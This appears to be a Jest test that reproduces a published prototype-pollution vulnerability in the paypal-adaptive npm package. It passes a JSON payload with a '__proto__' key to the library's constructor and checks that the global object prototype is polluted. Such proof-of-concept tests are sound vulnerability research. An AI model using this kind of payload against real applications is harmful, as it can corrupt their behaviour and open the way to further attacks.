//https://snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089

test("prototype pollution in paypal-adaptive", () => {
  expect({}.polluted).toBe(undefined);

  const PayPal = require("paypal-adaptive");
  const p = new PayPal(
    JSON.parse(
      '{"__proto__": {"polluted": "yes"}, "userId": "foo", "password": "bar", "signature": "abcd", "appId": "1234", "sandbox": "1234"}'
    )
  );

  expect({}.polluted).toBe("yes");
});
